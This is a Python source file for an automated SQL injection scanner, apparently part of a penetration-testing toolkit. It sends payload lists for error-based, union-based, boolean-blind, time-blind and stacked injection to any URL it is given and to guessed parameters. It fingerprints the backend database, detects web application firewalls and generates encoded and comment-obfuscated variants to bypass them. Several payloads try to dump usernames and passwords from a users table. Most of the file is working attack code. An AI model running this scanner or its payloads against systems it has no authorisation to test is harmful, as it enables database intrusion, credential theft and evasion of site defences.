"""Deep SQL injection detection — error-based, union-based, boolean-blind, time-blind, stacked, WAF bypass."""

import httpx
import re
import urllib.parse
import asyncio
import time
import random
import string

# --- Payload库: 每种技术多个变体 ---

ERROR_PAYLOADS = [
    ("single_quote", "'"),
    ("double_quote", '"'),
    ("or_true", "' OR '1'='1"),
    ("or_true_alt", "1 OR 1=1--"),
    ("or_true_comment", "' OR 1=1#"),
    ("and_true", "' AND '1'='1"),
    ("parenthesis", "') OR ('1'='1"),
    ("parenthesis_and", "') AND ('1'='1"),
    ("double_paren", "')) OR (('1'='1"),
    ("union_select", "' UNION SELECT NULL--"),
    ("union_all", "' UNION ALL SELECT 1,2,3--"),
    ("union_all_5", "' UNION ALL SELECT 1,2,3,4,5--"),
    ("union_all_10", "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--"),
    ("info_schema", "' UNION SELECT table_name,NULL FROM information_schema.tables--"),
    ("users_table", "' UNION SELECT username,password FROM users--"),
    ("concat_users", "' UNION SELECT CONCAT(username,':',password) FROM users--"),
    ("stacked_1", "'; SELECT 1--"),
    ("stacked_2", "'; SELECT @@version--"),
    ("stacked_3", "'; SELECT current_user()--"),
    ("inline_comment", "'/**/OR/**/1=1--"),
    ("inline_comment2", "'/*!OR*/1=1--"),
    ("newline_bypass", "'\nOR\n1=1--"),
    ("tab_bypass", "'\tOR\t1=1--"),
    ("plus_bypass", "'+OR+1=1--"),
    ("hex_bypass", "0x27 OR 1=1--"),
    ("char_bypass", "CHAR(39) OR 1=1--"),
]

TIME_PAYLOADS = [
    ("sleep_mysql", "' AND SLEEP(5)--", "mysql"),
    ("sleep_mysql_3", "'; SELECT SLEEP(5)--", "mysql"),
    ("benchmark_mysql", "' AND BENCHMARK(10000000,SHA1('test'))--", "mysql"),
    ("sleep_pg", "'; SELECT pg_sleep(5)--", "postgresql"),
    ("sleep_pg_case", "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "postgresql"),
    ("waitfor_mssql", "'; WAITFOR DELAY '0:0:5'--", "mssql"),
    ("waitfor_mssql_if", "'; IF (1=1) WAITFOR DELAY '0:0:5'--", "mssql"),
    ("sleep_oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "oracle"),
    ("sleep_sqlite", "' AND 1=randomblob(500000000)--", "sqlite"),
]

BOOLEAN_PAYLOADS = [
    ("bool_true", "' AND 1=1--", "' AND 1=2--"),
    ("bool_true_alt", "1 AND 1=1", "1 AND 1=2"),
    ("bool_true_str", "' AND 'a'='a'--", "' AND 'a'='b'--"),
    ("bool_length", "' AND LENGTH('a')=1--", "' AND LENGTH('a')=2--"),
    ("bool_substring", "' AND SUBSTRING('abc',1,1)='a'--", "' AND SUBSTRING('abc',1,1)='b'--"),
    ("bool_ascii", "' AND ASCII('a')=97--", "' AND ASCII('a')=98--"),
    ("bool_version", "' AND VERSION() IS NOT NULL--", "' AND VERSION() IS NULL--"),
]

UNION_PAYLOADS = [
    ("union_2", "' UNION SELECT NULL,NULL--"),
    ("union_3", "' UNION SELECT NULL,NULL,NULL--"),
    ("union_4", "' UNION SELECT NULL,NULL,NULL,NULL--"),
    ("union_5", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"),
    ("union_6", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--"),
    ("union_7", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--"),
    ("union_8", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"),
    ("union_9", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"),
    ("union_10", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"),
    ("union_all_2", "' UNION ALL SELECT NULL,NULL--"),
    ("union_all_3", "' UNION ALL SELECT NULL,NULL,NULL--"),
    ("union_all_5", "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--"),
    ("union_all_10", "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"),
    ("union_text", "' UNION SELECT 'a',NULL--"),
    ("union_number", "' UNION SELECT 1,NULL--"),
]

DB_FINGERPRINT_PAYLOADS = [
    ("mysql_version", "' UNION SELECT @@version,NULL--", r"mysql|mariadb"),
    ("mysql_user", "' UNION SELECT current_user(),NULL--", r"mysql|mariadb"),
    ("mysql_database", "' UNION SELECT database(),NULL--", r"mysql|mariadb"),
    ("pg_version", "' UNION SELECT version(),NULL--", r"postgresql"),
    ("pg_user", "' UNION SELECT current_user,NULL--", r"postgresql"),
    ("pg_database", "' UNION SELECT current_database(),NULL--", r"postgresql"),
    ("mssql_version", "' UNION SELECT @@version,NULL--", r"mssql|sql server"),
    ("mssql_user", "' UNION SELECT system_user,NULL--", r"mssql|sql server"),
    ("mssql_database", "' UNION SELECT db_name(),NULL--", r"mssql|sql server"),
    ("oracle_version", "' UNION SELECT banner,NULL FROM v$version--", r"oracle"),
    ("oracle_user", "' UNION SELECT user,NULL FROM dual--", r"oracle"),
    ("sqlite_version", "' UNION SELECT sqlite_version(),NULL--", r"sqlite"),
]

SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError",
    r"org\.postgresql\.util\.PSQLException",
    r"ERROR:\s+syntax error at or near",
    r"Microsoft.*ODBC.*SQL Server",
    r"Driver.*SQL Server",
    r"SQLServer JDBC",
    r"Unclosed quotation mark after the character string",
    r"SQLSTATE\[42000\]",
    r"Microsoft SQL Native Client error",
    r"mssql_query\(\)",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite",
    r"SQLite3::",
    r"\[SQLITE_ERROR\]",
    r"ORA-[0-9]{5}",
    r"Oracle.*driver",
    r"oracle\.jdbc",
    r"ORA-00933",
    r"ORA-00921",
    r"ORA-01756",
    r"Informix",
    r"CLI Driver.*DB2",
    r"DB2 SQL error",
    r"SQL Anywhere",
    r"Sybase",
    r"Teradata",
    r"Vertica",
    r"Impala",
    r"Hive\.QL",
]

WAF_SIGNATURES = [
    r"403 Forbidden",
    r"Access Denied",
    r"Request Blocked",
    r"Security Exception",
    r"ModSecurity",
    r"Web Application Firewall",
    r"INCAPSULA",
    r"imperva",
    r"CloudFlare",
    r"X-CDN",
    r"X-Frame-Options",
    r"ray_id",
    r"cf-request-id",
    r"server: cloudflare",
    r"AWS WAF",
    r"awswaf",
    r"F5 BIG-IP",
    r"Barracuda",
    r"Citrix NetScaler",
    r"FortiWeb",
    r"DenyAll",
    r"IBM DataPower",
]


def _build_test_urls(target: str, param: str) -> list[tuple[str, str]]:
    """Build baseline URLs and param names to test."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    if params:
        names = [param] if param else list(params.keys())
        return [(base, p) for p in names]

    names = [param] if param else ["id", "q", "search", "page", "user", "cat", "item", "sort", "order", "limit", "offset", "name", "key", "value", "type", "action", "product"]
    return [(base, p) for p in names]


def _waf_bypass_variants(payload: str) -> list[str]:
    """Generate WAF bypass variants of a payload."""
    variants = [payload]

    # URL encoding
    variants.append(urllib.parse.quote(payload, safe=""))

    # Double URL encoding
    variants.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))

    # Case variation for keywords
    keywords = ["OR", "AND", "UNION", "SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP", "SLEEP", "BENCHMARK", "WAITFOR"]
    modified = payload
    for kw in keywords:
        if kw.lower() in payload.lower():
            # Random case
            replacement = "".join(random.choice([c.upper(), c.lower()]) for c in kw)
            modified = re.sub(re.escape(kw), replacement, modified, flags=re.IGNORECASE)
    if modified != payload:
        variants.append(modified)

    # Inline comments
    comment_variants = []
    for kw in keywords:
        if kw.lower() in payload.lower():
            commented = re.sub(re.escape(kw), f"/**/{kw}/**/", payload, flags=re.IGNORECASE)
            comment_variants.append(commented)
    variants.extend(comment_variants[:3])

    # Newline/tab bypass
    for sep in ["\n", "\t", "\r\n", "%0a", "%09"]:
        bypass = payload.replace(" ", sep)
        if bypass != payload:
            variants.append(bypass)

    # Hex encoding for numeric values
    hex_variants = re.sub(r"\b(\d+)\b", lambda m: "0x" + hex(int(m.group(1)))[2:], payload)
    if hex_variants != payload:
        variants.append(hex_variants)

    return list(set(variants))


def _detect_waf(response: httpx.Response) -> dict | None:
    """Detect WAF from response headers and body."""
    body = response.text[:5000]
    headers = dict(response.headers)

    # Check status codes that indicate WAF
    waf_status = response.status_code in [403, 406, 429, 501, 419, 444]

    # Check headers
    waf_headers = {}
    for key, val in headers.items():
        lower_key = key.lower()
        if any(sig in lower_key for sig in ["cf-ray", "x-cdn", "x-sucuri", "x-firewall", "x-akamai"]):
            waf_headers[key] = val
        if any(sig in val.lower() for sig in ["cloudflare", "incapsula", "imperva", "akamai", "sucuri", "f5", "barracuda"]):
            waf_headers[key] = val

    # Check body for WAF signatures
    waf_body_matches = []
    for sig in WAF_SIGNATURES:
        if re.search(sig, body, re.IGNORECASE):
            waf_body_matches.append(sig)

    if waf_status or waf_headers or waf_body_matches:
        waf_name = "Unknown WAF"
        combined = str(waf_headers) + str(waf_body_matches)
        if "cloudflare" in combined.lower():
            waf_name = "Cloudflare"
        elif "incapsula" in combined.lower() or "imperva" in combined.lower():
            waf_name = "Imperva/Incapsula"
        elif "akamai" in combined.lower():
            waf_name = "Akamai"
        elif "sucuri" in combined.lower():
            waf_name = "Sucuri"
        elif "f5" in combined.lower():
            waf_name = "F5 BIG-IP"
        elif "barracuda" in combined.lower():
            waf_name = "Barracuda"
        elif "aws" in combined.lower() or "awswaf" in combined.lower():
            waf_name = "AWS WAF"

        return {
            "detected": True,
            "name": waf_name,
            "status_code": response.status_code,
            "headers": waf_headers,
            "body_signatures": waf_body_matches,
        }

    return None


def _fingerprint_db(body: str, headers: dict) -> dict:
    """Fingerprint database type from error messages and responses."""
    combined = body + " ".join(f"{k}: {v}" for k, v in headers.items())
    db_info = {"type": "unknown", "version": None, "evidence": None}

    patterns = {
        "mysql": [
            (r"MySQL\s+([\d.]+)", "version"),
            (r"mysql_(\d+\.x?\.\d+)", "version"),
            (r"MariaDB\s+([\d.]+)", "version"),
            (r"check the manual that corresponds to your MySQL", "evidence"),
        ],
        "postgresql": [
            (r"PostgreSQL\s+([\d.]+)", "version"),
            (r"PostgreSQL\s+([\d.]+).*on", "version"),
            (r"Npgsql\s+([\d.]+)", "version"),
        ],
        "mssql": [
            (r"Microsoft SQL Server\s+([\d.]+)", "version"),
            (r"SQL Server\s+([\d]+)", "version"),
            (r"ODBC SQL Server Driver", "evidence"),
        ],
        "oracle": [
            (r"Oracle\s+Database\s+([\d.]+)", "version"),
            (r"ORA-(\d{5})", "error_code"),
        ],
        "sqlite": [
            (r"SQLite\s+([\d.]+)", "version"),
            (r"SQLite3\s+([\d.]+)", "version"),
        ],
    }

    for db_name, db_patterns in patterns.items():
        for pattern, ptype in db_patterns:
            match = re.search(pattern, combined, re.IGNORECASE)
            if match:
                db_info["type"] = db_name
                if ptype == "version":
                    db_info["version"] = match.group(1)
                elif ptype == "evidence":
                    db_info["evidence"] = match.group(0)
                elif ptype == "error_code":
                    db_info["evidence"] = f"ORA-{match.group(1)}"
                return db_info

    return db_info


async def sqli_detect(target: str, param: str = "") -> dict:
    """Deep SQL injection detection with WAF bypass, DB fingerprinting, and multiple techniques."""
    test_targets = _build_test_urls(target, param)
    results = []
    waf_detected = None
    db_fingerprint = None

    async with httpx.AsyncClient(timeout=25.0, verify=False, follow_redirects=False) as client:
        for base, p in test_targets:
            baseline_val = "1"
            baseline_params = {p: baseline_val}
            baseline_url = f"{base}?{urllib.parse.urlencode(baseline_params)}"
            try:
                baseline_resp = await client.get(baseline_url)
                baseline_body = baseline_resp.text
                baseline_len = len(baseline_body)
                baseline_status = baseline_resp.status_code

                # Detect WAF on baseline
                waf = _detect_waf(baseline_resp)
                if waf:
                    waf_detected = waf
            except Exception:
                continue

            # --- ERROR-BASED SQLi ---
            for payload_name, payload in ERROR_PAYLOADS:
                variants = _waf_bypass_variants(payload) if waf_detected else [payload]
                for variant in variants[:3]:  # Limit variants to avoid timeout
                    try:
                        test_params = {p: variant}
                        url = f"{base}?{urllib.parse.urlencode(test_params)}"
                        resp = await client.get(url)
                        body = resp.text

                        error_detected = any(re.search(err, body, re.I) for err in SQL_ERRORS)
                        if error_detected:
                            db = _fingerprint_db(body, dict(resp.headers))
                            results.append({
                                "technique": "error_based",
                                "param": p,
                                "payload": payload_name,
                                "payload_value": variant[:100],
                                "error_detected": True,
                                "db_fingerprint": db,
                                "status": resp.status_code,
                                "response_diff": abs(len(body) - baseline_len),
                                "evidence": _extract_error_evidence(body),
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            if db_fingerprint is None and db["type"] != "unknown":
                                db_fingerprint = db
                            break
                    except Exception:
                        continue

            # --- BOOLEAN-BASED BLIND SQLi ---
            for payload_name, true_payload, false_payload in BOOLEAN_PAYLOADS:
                try:
                    true_url = f"{base}?{urllib.parse.urlencode({p: true_payload})}"
                    false_url = f"{base}?{urllib.parse.urlencode({p: false_payload})}"

                    true_resp = await client.get(true_url)
                    false_resp = await client.get(false_url)

                    true_len = len(true_resp.text)
                    false_len = len(false_resp.text)
                    true_status = true_resp.status_code
                    false_status = false_resp.status_code

                    # Check if true and false responses are significantly different
                    len_diff = abs(true_len - false_len)
                    len_ratio = max(true_len, false_len) / max(min(true_len, false_len), 1)

                    if (len_diff > 50 and len_ratio > 1.2) or (true_status != false_status and true_status == baseline_status):
                        results.append({
                            "technique": "boolean_blind",
                            "param": p,
                            "payload": payload_name,
                            "true_response_len": true_len,
                            "false_response_len": false_len,
                            "len_diff": len_diff,
                            "len_ratio": round(len_ratio, 2),
                            "true_status": true_status,
                            "false_status": false_status,
                            "risk": "CRITICAL",
                            "confidence": "high" if len_ratio > 1.5 else "medium",
                        })
                        break
                except Exception:
                    continue

            # --- TIME-BASED BLIND SQLi ---
            for payload_name, payload, db_type in TIME_PAYLOADS:
                try:
                    start_time = time.time()
                    url = f"{base}?{urllib.parse.urlencode({p: payload})}"
                    resp = await client.get(url)
                    elapsed = time.time() - start_time

                    if elapsed >= 4.5:  # 5 second delay detected
                        results.append({
                            "technique": "time_blind",
                            "param": p,
                            "payload": payload_name,
                            "delay_seconds": round(elapsed, 2),
                            "db_type": db_type,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        if db_fingerprint is None:
                            db_fingerprint = {"type": db_type, "version": None, "evidence": "time-based detection"}
                        break
                except Exception:
                    continue

            # --- UNION-BASED SQLi ---
            for payload_name, payload in UNION_PAYLOADS:
                try:
                    url = f"{base}?{urllib.parse.urlencode({p: payload})}"
                    resp = await client.get(url)
                    body = resp.text

                    # Check for SQL errors (indicates column count mismatch or injection point)
                    has_error = any(re.search(err, body, re.I) for err in SQL_ERRORS)
                    # Check if response is different from baseline
                    diff = abs(len(body) - baseline_len)
                    # Check for data leakage patterns
                    has_data = bool(re.search(r"<table|<tr|<td|<th|\[.*\{.*\}", body, re.I))

                    if has_error and diff > 100:
                        # Column count mismatch - try to find correct count
                        results.append({
                            "technique": "union_based",
                            "param": p,
                            "payload": payload_name,
                            "note": "Column count mismatch detected - injection likely possible",
                            "response_diff": diff,
                            "status": resp.status_code,
                            "risk": "HIGH",
                            "confidence": "medium",
                        })
                        break
                    elif has_data and diff > 200:
                        results.append({
                            "technique": "union_based",
                            "param": p,
                            "payload": payload_name,
                            "note": "Potential data leakage via UNION",
                            "response_diff": diff,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        break
                except Exception:
                    continue

            # --- DB FINGERPRINTING via UNION ---
            for payload_name, payload, db_pattern in DB_FINGERPRINT_PAYLOADS:
                try:
                    url = f"{base}?{urllib.parse.urlencode({p: payload})}"
                    resp = await client.get(url)
                    body = resp.text

                    if re.search(db_pattern, body, re.IGNORECASE) and len(body) > baseline_len + 50:
                        db = _fingerprint_db(body, dict(resp.headers))
                        if db["type"] != "unknown":
                            db_fingerprint = db
                            results.append({
                                "technique": "db_fingerprint",
                                "param": p,
                                "payload": payload_name,
                                "db_type": db["type"],
                                "db_version": db["version"],
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            break
                except Exception:
                    continue

    # --- SUMMARY ---
    return {
        "target": target,
        "params_tested": [p for _, p in test_targets],
        "waf_detected": waf_detected,
        "db_fingerprint": db_fingerprint,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }


def _extract_error_evidence(body: str) -> str:
    """Extract the most relevant SQL error from response body."""
    for err in SQL_ERRORS:
        match = re.search(err, body, re.IGNORECASE)
        if match:
            start = max(0, match.start() - 50)
            end = min(len(body), match.end() + 50)
            return body[start:end].strip()
    return ""
